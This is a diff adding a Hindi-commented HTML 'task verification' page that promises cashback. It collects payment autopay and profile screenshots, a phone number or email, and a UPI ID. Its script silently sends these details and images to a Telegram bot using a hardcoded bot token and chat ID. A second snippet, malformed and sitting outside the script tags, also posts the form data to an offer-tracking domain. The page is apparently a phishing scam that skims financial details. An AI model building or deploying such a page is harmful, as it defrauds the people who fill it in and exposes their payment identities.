@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Task Verification Portal</title>
+  <style>
+    :root {
+      --primary: #6200ea;
+      --primary-gradient: linear-gradient(135deg, #7c4dff, #6200ea);
+      --secondary: #f5f5f7;
+      --accent: #00e676;
+    }
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+    body {
+      font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      background-color: #e0e0e0;
+      padding: 15px;
+      display: flex;
+      justify-content: center;
+      min-height: 100vh;
+    }
+    .container {
+      background: white;
+      width: 100%;
+      max-width: 450px;
+      border-radius: 20px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+      overflow: hidden;
+      margin: auto;
+    }
+    .header {
+      background: var(--primary-gradient);
+      color: white;
+      padding: 25px 20px;
+      text-align: center;
+      border-bottom-left-radius: 30px;
+      border-bottom-right-radius: 30px;
+    }
+    .header h1 {
+      font-size: 24px;
+      letter-spacing: 0.5px;
+      margin-bottom: 5px;
+    }
+    .header p {
+      opacity: 0.9;
+      font-size: 14px;
+    }
+    .form-body {
+      padding: 20px;
+    }
+    .step-card {
+      background: #fafafa;
+      border: 1px solid #e0e0e0;
+      border-radius: 12px;
+      padding: 12px;
+      margin-bottom: 20px;
+    }
+    .step-title {
+      font-weight: 700;
+      color: var(--primary);
+      font-size: 13px;
+      text-transform: uppercase;
+      margin-bottom: 8px;
+    }
+    .demo-img {
+      width: 100%;
+      height: auto;
+      max-height: 350px;
+      object-fit: contain;
+      background: #fff;
+      border-radius: 8px;
+      border: 1px solid #ddd;
+      margin-bottom: 12px;
+      display: block;
+    }
+    .form-group {
+      margin-bottom: 16px;
+    }
+    label {
+      display: block;
+      margin-bottom: 6px;
+      font-weight: 600;
+      color: #333;
+      font-size: 14px;
+    }
+    input[type="text"], input[type="file"] {
+      width: 100%;
+      padding: 12px 14px;
+      border: 1.5px solid #ccc;
+      border-radius: 8px;
+      font-size: 14px;
+      outline: none;
+      transition: 0.2s border;
+      background: #fff;
+    }
+    input[type="text"]:focus {
+      border-color: var(--primary);
+    }
+    input[type="file"] {
+      padding: 8px;
+      cursor: pointer;
+    }
+    button {
+      width: 100%;
+      padding: 15px;
+      background: var(--primary-gradient);
+      color: white;
+      border: none;
+      border-radius: 10px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      box-shadow: 0 4px 10px rgba(98, 0, 234, 0.3);
+      transition: 0.2s transform;
+      margin-top: 10px;
+    }
+    button:active {
+      transform: scale(0.98);
+    }
+    button:disabled {
+      background: #aaa;
+      cursor: not-allowed;
+    }
+    #successScreen {
+      display: none;
+      text-align: center;
+      padding: 50px 20px;
+    }
+    .success-icon {
+      width: 70px;
+      height: 70px;
+      background: #e8f5e9;
+      color: #2e7d32;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 38px;
+      margin: 0 auto 15px;
+      border: 2px solid #a5d6a7;
+    }
+    #successScreen h2 {
+      color: #222;
+      font-size: 24px;
+      margin-bottom: 8px;
+    }
+    #successScreen p {
+      color: #666;
+      font-size: 14px;
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <div class="header">
+    <h1>Emergent AI Task</h1>
+    <p>Complete steps and verify below</p>
+  </div>
+
+  <div id="formContainer" class="form-body">
+    <form id="verifyForm">
+      <!-- STEP 1: PAYMENT SCREENSHOT -->
+      <div class="step-card">
+        <div class="step-title">Step 1: Payment Autopay Screenshot</div>
+        <img src="https://moymdyrekfcukvbspbej.supabase.co/storage/v1/object/public/uploads/a97ed321-a2f0-4a56-b308-afe4f5d7ed96/1794321273870-052400a7-3f23-4674-9a44-1ca97569a6dc-1000210420-cropped.jpeg" alt="Step 1 Preview" class="demo-img">
+        <label>Upload Screenshot 1 *</label>
+        <input type="file" id="screenshot1" accept="image/*" required>
+      </div>
+
+      <!-- STEP 2: PROFILE SCREENSHOT -->
+      <div class="step-card">
+        <div class="step-title">Step 2: Profile / Credit Screenshot</div>
+        <img src="https://moymdyrekfcukvbspbej.supabase.co/storage/v1/object/public/uploads/a97ed321-a2f0-4a56-b308-afe4f5d7ed96/1794321211586-3899a2e3-8892-4851-93c5-458dfcf79506-1000210404-cropped.jpeg" alt="Step 2 Preview" class="demo-img">
+        <label>Upload Screenshot 2 *</label>
+        <input type="file" id="screenshot2" accept="image/*" required>
+      </div>
+
+      <div class="form-group">
+        <label>Registered Email Or Mobile Number *</label>
+        <input type="text" id="phone" placeholder="Enter mobile number" required>
+      </div>
+
+      <div class="form-group">
+        <label>Campaign Registered UPI ID *</label>
+        <input type="text" id="upi" placeholder="Enter UPI ID" required>
+      </div>
+
+      <button type="submit" id="submitBtn">SUBMIT VERIFICATION</button>
+    </form>
+  </div>
+
+  <div id="successScreen">
+    <div class="success-icon">✓</div>
+    <h2>Verified!</h2>
+    <p>Done ✅<br>Wait 12-24 hours for cashback!</p>
+  </div>
+</div>
+
+<script>
+  // पेज लोड होते ही चेक करेगा कि क्या इस डिवाइस से फॉर्म पहले सबमिट हो चुका है
+  if (localStorage.getItem('taskSubmitted') === 'true') {
+    document.getElementById('formContainer').style.display = 'none';
+    document.getElementById('successScreen').style.display = 'block';
+  }
+
+  const botToken = '9245883033:AAHB9bJ7yOJafPCy1keJAI5zhzOkwYNagZs';
+  const chatId = '-1004393424619';
+
+  document.getElementById('verifyForm').addEventListener('submit', async (e) => {
+    e.preventDefault();
+
+    const submitBtn = document.getElementById('submitBtn');
+    submitBtn.disabled = true;
+    submitBtn.innerText = 'Verifying...';
+
+    const phone = document.getElementById('phone').value.trim();
+    const upi = document.getElementById('upi').value.trim();
+    const file1 = document.getElementById('screenshot1').files[0];
+    const file2 = document.getElementById('screenshot2').files[0];
+
+    // Get current Date & Time (IST)
+    const now = new Date();
+    const dateTime = now.toLocaleString('en-IN', { 
+      timeZone: 'Asia/Kolkata', 
+      dateStyle: 'medium', 
+      timeStyle: 'short' 
+    });
+
+    const caption = `🔔 NEW TASK SUBMISSION\n\n📱 Registered Number: ${phone}\n💳 UPI ID: ${upi}\n📅 Date & Time: ${dateTime}`;
+
+    // Create a Media Group to send photos together
+    const mediaGroup = [
+      { type: 'photo', media: 'attach://photo1', caption: caption },
+      { type: 'photo', media: 'attach://photo2' }
+    ];
+
+    const formData = new FormData();
+    formData.append('chat_id', chatId);
+    formData.append('media', JSON.stringify(mediaGroup));
+    formData.append('photo1', file1);
+    formData.append('photo2', file2);
+
+    try {
+      const res = await fetch(`https://api.telegram.org/bot${botToken}/sendMediaGroup`, {
+        method: 'POST',
+        body: formData
+      });
+
+      const data = await res.json();
+
+      if (data.ok) {
+        // सक्सेस होने पर ब्राउज़र को याद दिला देगा कि इस डिवाइस से फॉर्म सबमिट हो गया है
+        localStorage.setItem('taskSubmitted', 'true');
+        
+        document.getElementById('formContainer').style.display = 'none';
+        document.getElementById('successScreen').style.display = 'block';
+      } else {
+        const errorMsg = data.description || 'Unknown Telegram Error';
+        alert('Telegram Error: ' + errorMsg);
+        submitBtn.disabled = false;
+        submitBtn.innerText = 'SUBMIT VERIFICATION';
+      }
+    } catch (err) {
+      alert('Network Error! Please try again.');
+      submitBtn.disabled = false;
+      submitBtn.innerText = 'SUBMIT VERIFICATION';
+    }
+  });
+</script> document.querySelector('form').addEventListener('submit', async function(e) {
+  e.preventDefault();
+  const formData = new FormData(this);
+  try {
+    await fetch('https://offer.pathakcpa.in/campaign/6f4hq3', {
+      method: 'POST',
+      body: formData
+    });
+  } catch (error) {
+    console.error('Tracking failed', error);
+  }
+  // यहाँ से आप यूज़र को रीडायरेक्ट कर सकते हैं
+});
+  
+
+</body>
+</html>
